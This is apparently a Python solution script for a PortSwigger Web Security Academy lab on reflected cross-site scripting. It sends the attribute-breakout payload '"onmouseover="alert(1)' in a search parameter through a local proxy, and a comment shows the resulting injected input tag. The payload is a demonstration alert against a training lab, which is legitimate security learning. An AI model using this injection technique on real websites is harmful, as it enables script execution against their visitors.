# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac1b1f861edda782802840310014007f.web-security-academy.net"
url = scheme + host
cookies = {"session": "session=0vTQkp4MScwyoiKSQV10pbRdDT2LvHRS"}
payload = '"onmouseover="alert(1)'
params = {"search": payload}

requests.get(url, verify=verify, proxies=proxies, cookies=cookies, params=params)

# Requires user to mouse over the textbox in order for this attack to work so it's not completely automated
# <input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
